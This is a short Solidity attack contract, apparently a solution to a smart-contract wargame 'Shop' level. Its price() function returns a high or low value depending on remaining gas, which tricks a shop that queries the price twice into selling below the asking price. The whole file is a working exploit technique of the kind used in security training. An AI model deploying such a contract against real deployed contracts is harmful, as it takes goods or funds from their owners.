// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

interface IShop {
    function buy() external;
}


contract ShopAttacker { 
    IShop shop;
    bool alreadyCalled;

    event Log(string msg);

    constructor(address _address) {
        shop = IShop(_address);
        alreadyCalled = false;
    }

    function price() public view returns (uint) {
        if (gasleft() > 30000) {
            return 0x100;
        } else {
            return 1;
        }
    }

    function attack() public {
        shop.buy();
    }

}